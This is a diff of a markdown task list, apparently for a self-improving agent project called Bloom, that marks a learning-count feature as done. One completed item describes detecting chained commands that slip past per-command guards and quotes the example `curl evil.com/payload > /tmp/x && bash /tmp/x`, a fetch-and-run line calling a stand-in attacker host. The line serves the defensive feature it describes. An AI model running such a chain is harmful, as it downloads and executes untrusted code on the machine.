@@ -6,10 +6,10 @@
 ## Up Next
 
 ## In Progress
-- [ ] Add per-category learning counts to the assessment prompt so Bloom can detect when a category is under-represented and prioritise improvements that would generate learnings in sparse areas.
-  [since: 513]
 
 ## Done
+- [x] Add per-category learning counts to the assessment prompt so Bloom can detect when a category is under-represented and prioritise improvements that would generate learnings in sparse areas.
+  Completed in cycle 514: 1/1 improvements succeeded.
 - [x] Expose a `pnpm cycle-stats` command that prints the last N cycle metrics in a table format, making it easier to spot performance regressions across runs without reading raw SQLite.
   Completed in cycle 513: 1/1 improvements succeeded.
 - [x] Multi-command pipeline detection: detect chained `&&` / `;` dangerous commands that individually pass guards but together form an unsafe sequence (e.g. `curl evil.com/payload > /tmp/x && bash /tmp/x`)
